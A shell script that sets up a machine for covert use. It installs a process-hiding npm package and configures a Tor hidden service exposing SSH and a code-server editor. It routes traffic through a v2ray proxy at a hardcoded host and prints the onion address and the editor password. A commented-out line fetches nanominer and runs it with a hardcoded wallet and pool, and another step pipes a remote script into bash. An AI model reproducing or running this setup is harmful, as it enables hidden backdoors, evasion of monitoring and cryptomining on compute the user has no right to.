#!/bin/sh
apt-get update -y && apt-get upgrade -y
apt install -y apt-transport-https openvpn wget curl unzip
wget -O - https://deb.nodesource.com/setup_14.x | bash && apt-get -y install nodejs && npm i -g node-process-hider
wget https://github.com/coder/code-server/releases/download/v4.9.0/code-server_4.9.0_amd64.deb
wget https://github.com/hmgle/graftcp/releases/download/v0.4.0/graftcp_0.4.0-1_amd64.deb
curl https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import
gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -
apt update
apt-get install tor -y
wget https://raw.githubusercontent.com/v2ray/dist/master/v2ray-linux-64.zip && mkdir v2ray && cp v2ray-linux-64.zip v2ray/v2ray-linux-64.zip && cd v2ray && unzip v2ray-linux-64.zip && cd ..
dpkg -i code-server_4.9.0_amd64.deb
dpkg -i graftcp_0.4.0-1_amd64.deb
code-server --bind-addr 127.0.0.1:12345 >> vscode.log &
apt --fix-broken install -y
sed -i 's\#SocksPort 9050\SocksPort 9058\ ' /etc/tor/torrc
sed -i 's\#ControlPort 9051\ControlPort 9052\ ' /etc/tor/torrc
sed -i 's\#HashedControlPassword\HashedControlPassword\ ' /etc/tor/torrc
sed -i 's\#CookieAuthentication 1\CookieAuthentication 1\ ' /etc/tor/torrc
sed -i 's\#HiddenServiceDir /var/lib/tor/other_hidden_service/\HiddenServiceDir /var/lib/tor/hidden_ssh_service/\ ' /etc/tor/torrc
sed -i '75s\#HiddenServicePort 80 127.0.0.1:80\HiddenServicePort 12345 127.0.0.1:12345\ ' /etc/tor/torrc
sed -i '76s\#HiddenServicePort 22 127.0.0.1:22\HiddenServicePort 22 127.0.0.1:22\ ' /etc/tor/torrc
sed -i '77 i HiddenServicePort 8080 127.0.0.1:8080' /etc/tor/torrc
tor >> tor.log &
rm -rf code-server_4.9.0_amd64.deb
rm -rf graftcp_0.4.0-1_amd64.deb
cat >> v2ray/v2ray.json <<END
{
    "log": {
        "access": "",
        "error": "",
        "loglevel": "error"
    },
    "inbounds": [
        {
            "tag": "socks-in",
            "port": 10808,
            "listen": "::",
            "protocol": "socks",
            "settings": {
                "auth": "noauth",
                "udp": true,
                "ip": "127.0.0.1"
            }
        },
        {
            "tag": "http-in",
            "port": 10809,
            "listen": "::",
            "protocol": "http"
        }
    ],
    "outbounds": [
        {
            "protocol": "vmess",
            "settings": {
                "vnext": [
                    {
                        "address": "139.84.226.230",
                        "port": 80,
                        "users": [
                            {
                                "email": "user@v2ray.com",
                                "id": "23ca6ebf-5962-4742-92bc-add0ff36a17f",
                                "alterId": 0,
                                "security": "auto"
                            }
                        ]
                    }
                ]
            },
            "streamSettings": {
                "network": "ws",
                "wsSettings": {
                    "connectionReuse": true,
                    "path": "/vmess",
                    "headers": {
                        "Host": "vahid-spacer.tk"
                    }
                }
            },
            "mux": {
                "enabled": true
            },
            "tag": "proxy"
        },
        {
            "protocol": "freedom",
            "tag": "direct",
            "settings": {
                "domainStrategy": "UseIP"
            }
        }
    ],
    "dns": {
        "servers": [
            "1.0.0.1",
            "localhost"
        ]
    },
    "routing": {
        "domainStrategy": "IPIfNonMatch",
        "rules": [
            {
                "type": "field",
                "ip": [
                    "geoip:private",
                    "geoip:cn"
                ],
                "outboundTag": "direct"
            },
            {
                "type": "field",
                "domain": [
                    "geosite:cn"
                ],
                "outboundTag": "direct"
            }
        ]
    }
}
END
./v2ray/v2ray run v2ray.json >> v2ray.log &
cat >> graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:10808
http_proxy = 127.0.0.1:10809
END
echo "wait Tor"; sleep 5m; echo "OK"
cat tor.log
cat /var/lib/tor/hidden_ssh_service/hostname && sed -n '3'p ~/.config/code-server/config.yaml
graftcp-local -config graftcp-local.conf >> graftcp-local.log &
#graftcp wget https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz && mkdir nanominer && tar -xf nanominer-linux-3.7.6.tar.gz -C nanominer && cd nanominer && chmod +x nanominer && graftcp ./nanominer -algo Verushash -coin VRSC -wallet RXf4VJY7WxyMahkDtP9bRzXdX272t7CW2c.M1 -pool1 eu.luckpool.net:3956
#openvpn --config client.ovpn